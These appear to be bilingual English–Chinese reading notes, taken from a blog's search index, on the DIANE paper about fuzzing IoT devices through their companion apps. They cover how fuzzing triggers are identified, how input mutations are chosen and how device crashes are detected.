<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">We call a sequence of data-transforming functions a transformation data chain, and we refer to the first function in the sequence with the term top-chain function. We say that a top-chain function f affects a variable v if modifying the content of f’s variables eventually affects v’s value.</span><br><span class="line">top-chain function将会影响变量v的值，如果修改了函数f的变量的内容最终会影响V的值</span><br><span class="line"> the top-chain functions that affect sendMessage variables</span><br><span class="line"> To identify top-chain functions, we build the dominance tree^2 of each data-transforming function detected at the previous step (Line 13), </span><br><span class="line">我们为每一个data transforming函数建立数据结构：支配树</span><br><span class="line">and select those data-transforming functions that are not dominated by any other data-transforming function (Line 16). Finally, we consider as fuzzing triggers the collected top-chain functions.</span><br><span class="line">Note that, if no data-transforming function dominates a sendMessage function, we consider the sendMessage as a fuzzing trigger (Line 14, 15, and 16).</span><br></pre></td></tr></table></figure>



<p><img src="C:\Users\fourth\AppData\Roaming\Typora\typora-user-images\image-20210730204917972.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Our approach executes the same app multiple times, being consistent across the different runs. Thus, ideally, we want the app to follow always the same execution paths. T o achieve this goal, we require the analyst to run the app once, while DIANE records the generated UI inputs. Then, we automatically replay the same inputs in the subsequent runs, by leveraging RERAN [40]. </span><br><span class="line">我们的APP需要执行多次，为了减少UI误差，我们首先运行APP，然后使用DIANE记录所有的UI输入，然后使用RERAN来重放</span><br></pre></td></tr></table></figure>

<p>test case generation:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">• String lengths: </span><br><span class="line">	We change the length of strings in order to trigger buffer overflows and out-of-bound accesses. We</span><br><span class="line">generate random strings with different lengths.</span><br><span class="line">	改变字符串长度：产生溢出或者越界</span><br><span class="line"></span><br><span class="line">• Numerical values: </span><br><span class="line">	We change the values of integer, double or float values to cause integer overflows or out-of-bound accesses. We generate very large values, negative values, and the zero value.</span><br><span class="line"></span><br><span class="line">• Empty values:</span><br><span class="line">	We provide empty values, in the attempt to cause misinterpretation, uninitialized variable vulnerabilities, and null pointer dereferences.</span><br><span class="line">	制造空值，触发未初始化变量和空指针引用</span><br><span class="line"></span><br><span class="line">• Array lengths:</span><br><span class="line">	W e modify the content of arrays by removing or adding elements.</span><br></pre></td></tr></table></figure>

<p>Identifying Crashes</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">• Connection dropped. </span><br><span class="line">	Specifically, for TCP connections, we look for cases where the app sent a FIN packet and received no response (FIN + ACK), and then sent a sequence of two or more SYN packets.</span><br><span class="line">	FIN数据包无响应，且连续发送SYN数据包</span><br><span class="line">• HTTP Internal Server Error (500).</span><br><span class="line">	Instances where the app and the device communicate through HTTP , and the device returns an Internal Server Error [1] (status code 500), are considered as a signal that the device has entered in a faulty state.</span><br><span class="line">	设备500错误</span><br><span class="line">• Irregular network traffic size. </span><br><span class="line">	If the amount of data exchanged between the app and the device overcomes a threshold S_e, we save the current crash-inducing input. Our intuition is that, when a device enters a faulty state (e.g., due to a crash) it usually becomes temporarily unavailable for the app, thus drastically reducing the amount of data exchanged. In our experiments, we empirically verified that when the amount of exchanged data was less than 50% (compared to a regular run), something unusual happened to the device. For this reason, we set Seto be 50%.</span><br><span class="line">	不正常的流量：流量突然减少50%（与正常情况相比）</span><br><span class="line">• Heartbeat Monitoring. </span><br><span class="line">	While fuzzing a given device, we continuously ping it and monitor its response time. We report any crash-inducing inputs causing the response time to be above a certain threshold T_p. In our experiments, we set T_p to 10 seconds, as we empirically verified that the average response time of an IoT device falls within 1 second under normal conditions.</span><br><span class="line">	发送ping数据包，超过10s设备未响应，则出现异常</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Fuzzing</category>
      </categories>
      <tags>
        <tag>Fuzzing</tag>
        <tag>paper</tag>
      </tags>
  </entry>
</search>
